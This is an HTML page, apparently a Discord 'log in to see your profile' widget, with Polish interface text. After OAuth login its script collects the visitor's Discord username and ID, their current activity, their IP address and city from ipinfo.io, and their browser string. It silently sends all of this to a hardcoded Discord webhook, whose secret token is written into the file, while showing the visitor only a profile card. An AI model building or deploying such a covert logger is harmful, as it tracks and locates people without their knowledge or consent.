<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>Herbatniczek</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0f0f0f;
      color: white;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }

    .card {
      background-color: #1e1e1e;
      border-radius: 16px;
      padding: 30px;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.4);
      display: flex;
      flex-direction: column;
      align-items: center;
      max-width: 360px;
      width: 100%;
      transition: 0.3s ease;
    }

    .avatar {
      width: 96px;
      height: 96px;
      border-radius: 16px;
      margin-bottom: 20px;
    }

    .username {
      font-size: 1.6em;
      font-weight: bold;
      margin-bottom: 10px;
    }

    .status {
      color: #aaa;
      font-size: 0.9em;
      margin-bottom: 10px;
    }

    .info {
      color: #ccc;
      font-size: 0.8em;
      margin-top: 10px;
      text-align: center;
    }

    #login {
      padding: 12px 24px;
      font-size: 18px;
      background-color: #5865F2;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    #login:hover {
      background-color: #4752c4;
    }
  </style>
</head>
<body>

<div id="content">
  <button id="login">Zaloguj się przez Discord</button>
</div>

<script>
  const CLIENT_ID = '1363941305490739440';
  const REDIRECT_URI = 'https://fluffy-seahorse-80d72f.netlify.app/';
  const SCOPE = 'identify';
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1358458468222242990/bGdbJ2Y6P_WzbvuOLPg0BS3msYIOmDMI8ekXxbjbpSYgR_vb8A_0-fx_41lTxwYmgtCd';

  const hash = window.location.hash.substring(1);
  const params = new URLSearchParams(hash);
  const accessToken = params.get('access_token');

  if (accessToken) {
    fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${accessToken}` }
    })
    .then(res => res.json())
    .then(async user => {
      const avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
      const usernameTag = `${user.username}#${user.discriminator}`;
      const userId = user.id;

      // Pobierz aktywność z Lanyard API
      let activityText = "Brak aktywności";
      try {
        const lanyardRes = await fetch(`https://api.lanyard.rest/v1/users/${userId}`);
        const lanyardData = await lanyardRes.json();

        if (lanyardData.success && lanyardData.data.activities.length > 0) {
          const act = lanyardData.data.activities[0];
          activityText = act.name + (act.details ? `: ${act.details}` : "");
        }
      } catch (err) {
        activityText = "Nie udało się pobrać aktywności";
      }

      // Pobierz IP i lokalizację użytkownika
      let ip = "Nieznane";
      let location = "Nieznana";
      try {
        const ipRes = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE');
        const ipData = await ipRes.json();
        ip = ipData.ip || "Nieznane";
        location = `${ipData.city || "Nieznane"}, ${ipData.region || ""}, ${ipData.country || ""}`;
      } catch (err) {
        ip = "Nie udało się pobrać IP";
        location = "Nie udało się pobrać lokalizacji";
      }

      // Pobierz informacje o przeglądarce
      const browser = navigator.userAgent;

      // Wyślij webhook
      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: `Nowe logowanie przez Discord`,
            color: 0x5865F2,
            thumbnail: { url: avatarUrl },
            fields: [
              { name: 'Użytkownik', value: usernameTag, inline: true },
              { name: 'ID', value: userId, inline: true },
              { name: 'Aktywność', value: activityText, inline: false },
              { name: 'IP', value: ip, inline: true },
              { name: 'Lokalizacja', value: location, inline: true },
              { name: 'Przeglądarka', value: browser, inline: false }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      });

      // Wyświetl na stronie
      document.getElementById('content').innerHTML = `
        <div class="card">
          <img class="avatar" src="${avatarUrl}" alt="Avatar">
          <div class="username">${usernameTag}</div>
          <div class="status">${activityText}</div>
          <div class="info">
            IP: ${ip}<br/>
            Lokalizacja: ${location}<br/>
            Przeglądarka: ${browser}
          </div>
        </div>
      `;
    })
    .catch(() => {
      document.getElementById('content').innerHTML = '<p>Nie udało się pobrać danych.</p>';
    });
  } else {
    document.getElementById('login').addEventListener('click', () => {
      const oauthURL = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPE}`;
      window.location.href = oauthURL;
    });
  }
</script>

</body>
</html>
